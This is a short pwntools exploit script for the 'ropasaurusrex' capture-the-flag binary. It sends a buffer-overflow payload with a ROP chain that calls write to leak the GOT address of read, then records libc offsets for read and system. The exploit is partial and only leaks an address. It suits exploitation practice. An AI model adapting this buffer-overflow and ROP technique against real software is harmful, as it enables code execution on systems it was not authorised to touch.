from pwn import *

## Helping...
#context(terminal=['tmux','new-window'])
#p = gdb.debug('./ropasaurusrex-', 'b main')
p = process('./ropasaurusrex-')
context(os='linux',arch='amd64')
#context.log_level = 'DEBUG'

## Address
read_plt = p32(0x0804832c)
read_plt_got = p32(0x804961c)
write_plt = p32(0x0804830c)
##ret_addr = 0x41414141
ret_addr = p32(0x080484b6)
dynamic = p32(0x08049530)

payload = "A"*132+"BBBB"+"CCCC" 
payload += write_plt
payload += ret_addr
payload += p32(1)
payload += read_plt_got
payload += p32(4)
raw_input()
p.send(payload)
data = p.read(4)
##raw_input()

print(hex(u32(data)))
read_sys = 0xd5b00
sys_libc = 0x3ada0

p.interactive()